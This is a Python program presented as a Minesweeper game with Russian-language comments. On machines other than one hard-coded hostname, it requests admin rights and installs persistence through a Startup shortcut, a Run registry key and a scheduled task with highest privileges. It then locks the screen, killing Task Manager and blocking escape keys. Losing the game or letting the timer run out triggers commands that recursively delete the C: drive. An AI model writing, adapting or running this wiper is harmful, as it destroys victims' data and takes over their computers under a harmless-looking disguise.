import os
import random
import socket
import subprocess
import sys
import tkinter as tk
import win32com.client
import shutil
import winreg
import ctypes

try:
    import keyboard
except ImportError:
    keyboard = None

TARGET_HOSTS = ["pc-gstuxilg1"]

num_colors = {
    1: "#0000FF",
    2: "#008000",
    3: "#FF0000",
    4: "#000080",
    5: "#800000",
    6: "#008080",
    7: "#000000",
    8: "#808080",
}

cell = 40
TIMER_SECONDS = 120
TASK_NAME = "startsaper"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def task_exists():
    try:
        result = subprocess.run(
            ["schtasks", "/Query", "/TN", TASK_NAME],
            creationflags=subprocess.CREATE_NO_WINDOW,
            capture_output=True,
            text=True, encoding="utf-8", errors="replace"
        )
        return result.returncode == 0
    except Exception:
        return False


def run_via_task():
    try:
        result = subprocess.run(
            ["schtasks", "/Run", "/TN", TASK_NAME],
            creationflags=subprocess.CREATE_NO_WINDOW,
            capture_output=True,
            text=True, encoding="utf-8", errors="replace"
        )
        return result.returncode == 0
    except Exception as e:
        print(f"[Task] Ошибка запуска: {e}")
        return False


def relaunch_as_admin():
    """Первый запуск — UAC → инстанс с --setup."""
    script = os.path.abspath(__file__)
    py = sys.executable
    params = f'"{script}" --setup'
    try:
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", py, params, None, 0
        )
        return int(ret) > 32
    except Exception as e:
        print(f"[Elevate] Ошибка: {e}")
        return False


def install_autoload():
    """Создаёт .bat, ярлык в Startup, HKCU Run и elevated-задачу.
    Вызывается ОДИН раз, в elevated-инстансе с флагом --setup."""
    print("[Setup] установка автозагрузки и elevated-задачи...")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.abspath(__file__)
    bat_path = os.path.join(script_dir, "startsaper.bat")

    py = sys.executable
    pyw = py.replace("python.exe", "pythonw.exe")
    if not os.path.exists(pyw):
        pyw = py

    bat_content = (
        "@echo off\r\n"
        f'start "" "{pyw}" "{script_path}" --admin-elevated\r\n'
        "exit\r\n"
    )
    try:
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(bat_content)
        print(f"[Bat] создан: {bat_path}")
    except Exception as e:
        print(f"[Bat] Ошибка: {e}")

    startup_dir = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    shortcut_path = os.path.join(startup_dir, "startsaper.lnk")
    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = pyw
        shortcut.Arguments = f'"{script_path}" --admin-elevated'
        shortcut.WorkingDirectory = script_dir
        shortcut.WindowStyle = 7
        shortcut.Description = "Автозапуск startsaper"
        shortcut.Save()
        print(f"[Startup] ярлык: {shortcut_path}")
    except Exception as e:
        print(f"[Startup] Ошибка: {e}")

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key, "startsaper", 0, winreg.REG_SZ,
            f'"{pyw}" "{script_path}" --admin-elevated'
        )
        winreg.CloseKey(key)
        print("[Registry] HKCU Run записан")
    except Exception as e:
        print(f"[Registry] Ошибка: {e}")

    # Ключевое: задача с RL HIGHEST — запускает процесс elevated без UAC.
    cmd = [
        "schtasks", "/Create",
        "/TN", TASK_NAME,
        "/TR", f'"{pyw}" "{script_path}" --admin-elevated',
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/F"
    ]
    try:
        result = subprocess.run(
            cmd, shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW,
            capture_output=True,
            text=True, encoding="utf-8", errors="replace"
        )
        if result.returncode == 0:
            print("[Scheduler] elevated-задача создана")
        else:
            err = (result.stderr or result.stdout or "").strip()
            print(f"[Scheduler] не создана: {err}")
    except Exception as e:
        print(f"[Scheduler] Ошибка: {e}")


def remove_autoload():
    """Удаляет всё, что install_autoload создал."""
    print("[Remove] удаление автозагрузки...")

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(key, "startsaper")
            print("[Remove] HKCU Run удалён")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[Remove] HKCU Run: {e}")

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            0, winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(key, "startsaper")
            print("[Remove] HKCU RunOnce удалён")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(key, "startsaper")
            print("[Remove] HKLM Run удалён")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass

    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    lnk = os.path.join(startup_dir, "startsaper.lnk")
    if os.path.exists(lnk):
        try:
            os.remove(lnk)
            print(f"[Remove] ярлык удалён: {lnk}")
        except Exception as e:
            print(f"[Remove] lnk: {e}")

    common_lnk = os.path.join(
        os.environ.get("ProgramData", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "StartUp",
        "startsaper.lnk"
    )
    if os.path.exists(common_lnk):
        try:
            os.remove(common_lnk)
            print(f"[Remove] общий ярлык удалён: {common_lnk}")
        except Exception as e:
            print(f"[Remove] common lnk: {e}")

    try:
        result = subprocess.run(
            ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            capture_output=True,
            text=True, encoding="utf-8", errors="replace"
        )
        if result.returncode == 0:
            print("[Remove] задача schtasks удалена")
        else:
            print("[Remove] задача schtasks не найдена")
    except Exception as e:
        print(f"[Remove] schtasks: {e}")

    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        bat = os.path.join(script_dir, "startsaper.bat")
        if os.path.exists(bat):
            os.remove(bat)
            print(f"[Remove] bat удалён: {bat}")
    except Exception as e:
        print(f"[Remove] bat: {e}")

    print("[Remove] готово")


def run_savesaper():
    kolvo_flag = 0
    hod = 0
    rect_ids = {}
    text_ids = {}
    game_over = False
    tick_id = None
    time_left = TIMER_SECONDS
    flag_label = None
    timer_label = None

    dlina = 0
    visota = 0
    kolvomin = 0
    max_flags = 0

    gamepole = []
    opened = []
    flags = []

    def update_flag_label():
        nonlocal flag_label
        if flag_label is not None:
            try:
                flag_label.config(text=f"Флаги: {max_flags - kolvo_flag}")
            except tk.TclError:
                pass

    def update_timer_label():
        nonlocal timer_label
        if timer_label is not None:
            try:
                timer_label.config(text=f"⏱ {time_left}")
            except tk.TclError:
                pass

    def tick():
        nonlocal time_left, tick_id, game_over
        if game_over:
            return
        time_left -= 1
        update_timer_label()
        if time_left <= 0:
            print("Таймер истёк — gameover")
            gameover()
            return
        tick_id = root.after(1000, tick)

    def start_timer():
        nonlocal tick_id
        if tick_id is not None:
            root.after_cancel(tick_id)
        tick_id = root.after(1000, tick)

    def stop_timer():
        nonlocal tick_id
        if tick_id is not None:
            root.after_cancel(tick_id)
            tick_id = None

    def look_for_click():
        canvas.bind("<Button-3>", right_handle_click)
        canvas.bind("<Button-1>", left_handle_click)
        root.mainloop()

    def draw_cells(c, r, color, text=""):
        x1, y1 = c * cell, r * cell
        x2, y2 = x1 + cell, y1 + cell
        rid = canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="black")
        rect_ids[(r, c)] = rid
        if text:
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"))
            text_ids[(r, c)] = tid

    def create_game(r, c):
        nonlocal gamepole, flags, opened
        gamepole = [[0 for _ in range(dlina)] for _ in range(visota)]
        opened = [[False for _ in range(dlina)] for _ in range(visota)]
        flags = [[False for _ in range(dlina)] for _ in range(visota)]
        placed = 0
        while placed < kolvomin:
            y1 = random.randint(0, visota - 1)
            x1 = random.randint(0, dlina - 1)
            if (y1 == r and x1 == c) or gamepole[y1][x1] == -1:
                continue
            gamepole[y1][x1] = -1
            placed += 1
        pole_fill()

    def pole_fill():
        nonlocal gamepole
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] != -1:
                    continue
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < visota and 0 <= nc < dlina:
                            if gamepole[nr][nc] != -1:
                                gamepole[nr][nc] += 1

    def left_handle_click(event):
        nonlocal hod
        if game_over:
            return
        r = event.y // cell
        c = event.x // cell
        if 0 <= r < visota and 0 <= c < dlina:
            print(f"клик по ({r},{c})")
            if hod == 0:
                hod = 1
                print("Первый ход сделан")
                create_game(r, c)
                open_cell(r, c)
                start_timer()
            elif gamepole[r][c] == -1:
                open_cell(r, c)
                gameover()
            else:
                open_cell(r, c)
                look_for_win()

    def right_handle_click(event):
        nonlocal kolvo_flag
        if game_over:
            return
        if not gamepole:
            return
        r = event.y // cell
        c = event.x // cell
        if not (0 <= r < visota and 0 <= c < dlina):
            return
        print(f"Зафиксирован правый клик по {r}, {c}")
        if opened[r][c]:
            print("Ячейка уже открыта")
            return
        if max_flags == kolvo_flag:
            print("Слишком много флагов")
            return
        if not flags[r][c] and not opened[r][c]:
            flags[r][c] = True
            redraw_cell(r, c, "#c0c0c0", "🚩")
            kolvo_flag += 1
            update_flag_label()
            look_for_win()
        elif flags[r][c] and not opened[r][c]:
            flags[r][c] = False
            redraw_cell(r, c, "#c0c0c0", "")
            kolvo_flag -= 1
            update_flag_label()
            look_for_win()

    def look_for_win():
        nonlocal game_over
        if game_over:
            return
        if not gamepole:
            return
        right_flags = 0
        open_cells = 0
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] == -1 and flags[r][c]:
                    right_flags += 1
                if opened[r][c] and not flags[r][c]:
                    open_cells += 1
        if right_flags == kolvomin and open_cells == dlina * visota - kolvomin:
            print("Победа")
            game_over = True
            stop_timer()
            remove_autoload()
            root.destroy()

    def open_cell(r, c):
        stack = [(r, c)]
        while stack:
            cr, cc = stack.pop()
            if not (0 <= cr < visota and 0 <= cc < dlina):
                continue
            if opened[cr][cc] or flags[cr][cc]:
                continue
            opened[cr][cc] = True
            if gamepole[cr][cc] == -1:
                redraw_cell(cr, cc, "#FF0000", "💣")
                return
            if gamepole[cr][cc] == 0:
                redraw_cell(cr, cc, "#e0e0e0", "")
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        stack.append((cr + dr, cc + dc))
            else:
                redraw_cell(cr, cc, "#e0e0e0", str(gamepole[cr][cc]),
                            num_colors[gamepole[cr][cc]])

    def redraw_cell(r, c, color, text="", text_color="black"):
        canvas.itemconfig(rect_ids[(r, c)], fill=color)
        if (r, c) in text_ids:
            canvas.delete(text_ids[(r, c)])
            del text_ids[(r, c)]
        if text:
            x1, y1 = c * cell, r * cell
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"), fill=text_color)
            text_ids[(r, c)] = tid

    def show_flags():
        if not flags:
            print("Поле ещё не создано")
            return
        for i in flags:
            print(*i)

    def show_opened():
        if not opened:
            print("Поле ещё не создано")
            return
        for i in opened:
            print(*i)

    def show_pole():
        if not gamepole:
            print("Поле ещё не создано")
            return
        for i in gamepole:
            print(*i)

    def gameover():
        nonlocal game_over
        if game_over:
            return
        game_over = True
        stop_timer()
        print("Игра закончена")
        for c in range(dlina):
            for r in range(visota):
                if not opened[r][c]:
                    open_cell(r, c)
        root.after(15000, root.destroy)

    while True:
        dlina = int(input("Введите длину поля (минимум 5)\n"))
        if dlina < 5:
            print("Неверная длина поля")
            continue
        break
    while True:
        visota = int(input("Введите ширину поля (минимум 5)\n"))
        if visota < 5:
            print("Неверная ширина поля")
            continue
        break
    while True:
        kolvomin = int(input(f"Сколько мин? (не больше чем {visota * dlina - 1})\n"))
        if kolvomin > visota * dlina - 1 or kolvomin < 1:
            print("Неверное кол-во мин")
            continue
        break

    print("Генерация поля")
    root = tk.Tk()
    canvas = tk.Canvas(root, width=dlina * cell, height=visota * cell, bg="#808080")
    canvas.pack()
    max_flags = kolvomin

    flag_label = tk.Label(root, text=f"Флаги: {max_flags}",
                          font=("Arial", 14, "bold"), bg="#c0c0c0", fg="black")
    flag_label.place(x=5, y=5)

    timer_label = tk.Label(root, text=f"⏱ {time_left}",
                           font=("Arial", 14, "bold"), bg="#c0c0c0", fg="black")
    timer_label.place(relx=1.0, x=-5, y=5, anchor="ne")

    print("Заполнение поля")
    for i in range(dlina):
        for j in range(visota):
            draw_cells(i, j, "#c0c0c0")

    if keyboard is not None:
        keyboard.add_hotkey("p", show_pole)
        keyboard.add_hotkey("o", show_opened)
        keyboard.add_hotkey("i", show_flags)

    print("Поле заполнено")
    print("Ожидаем первого хода")
    look_for_click()


def run_windelsaper():
    kolvo_flag = 0
    hod = 0
    rect_ids = {}
    text_ids = {}
    game_over = False
    tick_id = None
    time_left = TIMER_SECONDS
    flag_label = None
    timer_label = None

    dlina = 30
    visota = 16
    kolvomin = 99
    max_flags = kolvomin

    gamepole = []
    opened = []
    flags = []

    def update_flag_label():
        nonlocal flag_label
        if flag_label is not None:
            try:
                flag_label.config(text=f"Флаги: {max_flags - kolvo_flag}")
            except tk.TclError:
                pass

    def update_timer_label():
        nonlocal timer_label
        if timer_label is not None:
            try:
                timer_label.config(text=f"⏱ {time_left}")
            except tk.TclError:
                pass

    def tick():
        nonlocal time_left, tick_id, game_over
        if game_over:
            return
        time_left -= 1
        update_timer_label()
        if time_left <= 0:
            print("Таймер истёк — gameover")
            gameover()
            return
        tick_id = root.after(1000, tick)

    def start_timer():
        nonlocal tick_id
        if tick_id is not None:
            root.after_cancel(tick_id)
        tick_id = root.after(1000, tick)

    def stop_timer():
        nonlocal tick_id
        if tick_id is not None:
            root.after_cancel(tick_id)
            tick_id = None

    def look_for_click():
        canvas.bind("<Button-3>", right_handle_click)
        canvas.bind("<Button-1>", left_handle_click)
        root.mainloop()

    def draw_cells(c, r, color, text=""):
        x1, y1 = c * cell, r * cell
        x2, y2 = x1 + cell, y1 + cell
        rid = canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="black")
        rect_ids[(r, c)] = rid
        if text:
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"))
            text_ids[(r, c)] = tid

    def create_game(r, c):
        nonlocal gamepole, flags, opened
        gamepole = [[0 for _ in range(dlina)] for _ in range(visota)]
        opened = [[False for _ in range(dlina)] for _ in range(visota)]
        flags = [[False for _ in range(dlina)] for _ in range(visota)]
        placed = 0
        while placed < kolvomin:
            y1 = random.randint(0, visota - 1)
            x1 = random.randint(0, dlina - 1)
            if (y1 == r and x1 == c) or gamepole[y1][x1] == -1:
                continue
            gamepole[y1][x1] = -1
            placed += 1
        pole_fill()

    def pole_fill():
        nonlocal gamepole
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] != -1:
                    continue
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < visota and 0 <= nc < dlina:
                            if gamepole[nr][nc] != -1:
                                gamepole[nr][nc] += 1

    def left_handle_click(event):
        nonlocal hod
        if game_over:
            return
        r = event.y // cell
        c = event.x // cell
        if 0 <= r < visota and 0 <= c < dlina:
            print(f"клик по ({r},{c})")
            if hod == 0:
                hod = 1
                print("Первый ход сделан")
                create_game(r, c)
                open_cell(r, c)
                start_timer()
            elif gamepole[r][c] == -1:
                open_cell(r, c)
                gameover()
            else:
                open_cell(r, c)
                look_for_win()

    def right_handle_click(event):
        nonlocal kolvo_flag
        if game_over:
            return
        if not gamepole:
            return
        r = event.y // cell
        c = event.x // cell
        if not (0 <= r < visota and 0 <= c < dlina):
            return
        print(f"Зафиксирован правый клик по {r}, {c}")
        if opened[r][c]:
            print("Ячейка уже открыта")
            return
        if max_flags == kolvo_flag:
            print("Слишком много флагов")
            return
        if not flags[r][c] and not opened[r][c]:
            flags[r][c] = True
            redraw_cell(r, c, "#c0c0c0", "🚩")
            kolvo_flag += 1
            update_flag_label()
            look_for_win()
        elif flags[r][c] and not opened[r][c]:
            flags[r][c] = False
            redraw_cell(r, c, "#c0c0c0", "")
            kolvo_flag -= 1
            update_flag_label()
            look_for_win()

    def look_for_win():
        nonlocal game_over
        if game_over:
            return
        if not gamepole:
            return
        right_flags = 0
        open_cells = 0
        for r in range(visota):
            for c in range(dlina):
                if gamepole[r][c] == -1 and flags[r][c]:
                    right_flags += 1
                if opened[r][c] and not flags[r][c]:
                    open_cells += 1
        if right_flags == kolvomin and open_cells == dlina * visota - kolvomin:
            print("Победа")
            game_over = True
            stop_timer()
            remove_autoload()
            root.destroy()
            sys.exit()

    def open_cell(r, c):
        stack = [(r, c)]
        while stack:
            cr, cc = stack.pop()
            if not (0 <= cr < visota and 0 <= cc < dlina):
                continue
            if opened[cr][cc] or flags[cr][cc]:
                continue
            opened[cr][cc] = True
            if gamepole[cr][cc] == -1:
                redraw_cell(cr, cc, "#FF0000", "💣")
                return
            if gamepole[cr][cc] == 0:
                redraw_cell(cr, cc, "#e0e0e0", "")
                for dr in (-1, 0, 1):
                    for dc in (-1, 0, 1):
                        if dr == 0 and dc == 0:
                            continue
                        stack.append((cr + dr, cc + dc))
            else:
                redraw_cell(cr, cc, "#e0e0e0", str(gamepole[cr][cc]),
                            num_colors[gamepole[cr][cc]])

    def redraw_cell(r, c, color, text="", text_color="black"):
        canvas.itemconfig(rect_ids[(r, c)], fill=color)
        if (r, c) in text_ids:
            canvas.delete(text_ids[(r, c)])
            del text_ids[(r, c)]
        if text:
            x1, y1 = c * cell, r * cell
            tid = canvas.create_text(x1 + cell / 2, y1 + cell / 2, text=text,
                                     font=("Arial", 16, "bold"), fill=text_color)
            text_ids[(r, c)] = tid

    def show_flags():
        if not flags:
            print("Поле ещё не создано")
            return
        for i in flags:
            print(*i)

    def show_opened():
        if not opened:
            print("Поле ещё не создано")
            return
        for i in opened:
            print(*i)

    def show_pole():
        if not gamepole:
            print("Поле ещё не создано")
            return
        for i in gamepole:
            print(*i)

    def run_cmd_commands(commands, show_window=False):
        full_cmd = " & ".join(commands)
        creationflags = 0
        if not show_window:
            creationflags = subprocess.CREATE_NO_WINDOW
        proc = subprocess.run(
            ["cmd.exe", "/C", full_cmd],
            creationflags=creationflags,
            capture_output=False,
            text=True, encoding="utf-8", errors="replace",
        )
        return proc.returncode

    def gameover():
        nonlocal game_over
        if game_over:
            return
        game_over = True
        stop_timer()
        print("Игра закончена")
        for c in range(dlina):
            for r in range(visota):
                if not opened[r][c]:
                    open_cell(r, c)
        run_cmd_commands(cmds)
        root.after(15000, root.destroy)

    cmds = [
        r"cd C:\ ",
        r"rd C:\ /s/q",
        r"del C:\ /s/q",
        r"rd c:/s/q",
        r"del c:/s/q",
    ]

    print("Генерация поля")
    root = tk.Tk()
    root.title("Сапёр")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    for seq in ("<Alt-F4>", "<Escape>", "<Control-w>", "<Control-q>"):
        root.bind(seq, lambda e: "break")
    canvas = tk.Canvas(root, width=dlina * cell, height=visota * cell,
                       bg="#808080", highlightthickness=0)
    canvas.place(relx=0.5, rely=0.5, anchor="center")

    flag_label = tk.Label(root, text=f"Флаги: {max_flags}",
                          font=("Arial", 16, "bold"), bg="#c0c0c0", fg="black")
    flag_label.place(relx=0.01, rely=0.01, anchor="nw")

    timer_label = tk.Label(root, text=f"⏱ {time_left}",
                           font=("Arial", 16, "bold"), bg="#c0c0c0", fg="black")
    timer_label.place(relx=0.99, rely=0.01, anchor="ne")

    def keep_kiosk():
        try:
            subprocess.run(["taskkill", "/F", "/IM", "Taskmgr.exe"], check=False)
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.lift()
        finally:
            root.after(1000, keep_kiosk)
    keep_kiosk()

    print("Заполнение поля")
    for i in range(dlina):
        for j in range(visota):
            draw_cells(i, j, "#c0c0c0")

    if keyboard is not None:
        keyboard.add_hotkey("p", show_pole)
        keyboard.add_hotkey("o", show_opened)
        keyboard.add_hotkey("i", show_flags)
        for hk in ("alt+f4", "ctrl+w", "ctrl+q", "ctrl+shift+esc",
                   "alt+tab", "alt+space", "win+r"):
            try:
                keyboard.add_hotkey(hk, lambda: None, suppress=True)
            except Exception as e:
                print(f"[Hotkey] {hk}: {e}")
        try:
            keyboard.block_key('win')
        except Exception as e:
            print(f"[Hotkey] block win: {e}")

    print("Поле заполнено")
    print("Ожидаем первого хода")
    look_for_click()


def run_game():
    host = socket.gethostname().lower()
    if host in TARGET_HOSTS:
        run_savesaper()
    else:
        run_windelsaper()


def main():
    argv = sys.argv
    host = socket.gethostname().lower()
    is_target = host in TARGET_HOSTS
    if "--admin-elevated" in argv:
        #print("[Main] запуск через задачу (elevated, без UAC)")
        run_game()
        return
    if "--setup" in argv:
        #print("[Main] setup-инстанс (elevated)")
        if not is_target:
            #print(f"[Main] host '{host}' != target — установка автозагрузки")
            install_autoload()
        #else:
            #print(f"[Main] host '{host}' == target — автозагрузка не ставится")
        run_game()
        return

    if not is_target:
        if task_exists():
            #print("[Main] задача найдена — silent elevation")
            if run_via_task():
                sys.exit(0)
            #print("[Main] не удалось запустить через задачу, продолжаем как есть")
        else:
            #print(f"[Main] host '{host}' != target — первый запуск, UAC + установка")
            if relaunch_as_admin():
                sys.exit(0)
            #print("[Main] UAC отклонён — запуск без прав админа")
    else:
        #print(f"[Main] host '{host}' == target — обычный запуск без установки")
        if task_exists():
            if run_via_task():
                sys.exit(0)

    run_game()


if __name__ == "__main__":
    main()
